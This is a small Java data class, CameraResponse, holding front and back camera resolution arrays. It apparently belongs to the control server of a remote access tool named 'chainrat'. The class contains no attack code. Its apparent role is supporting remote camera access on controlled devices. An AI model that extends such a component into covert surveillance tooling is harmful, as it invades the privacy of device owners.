package com.nefi.chainrat.server.network.ControlServer.packets;

import com.nefi.chainrat.server.network.ControlServer.CommandType;
import com.sun.glass.ui.Size;

public class CameraResponse{
    public int[] frontWidth;
    public int[] frontHeight;
    public int[] backWidth;
    public int[] backHeight;

    public CameraResponse( int[] frontWidth,  int[] frontHeight, int[] backWidth, int[] backHeight){
        this.frontWidth = frontWidth;
        this.frontHeight = frontHeight;
        this.backWidth = backWidth;
        this.backHeight = backHeight;
    }
}
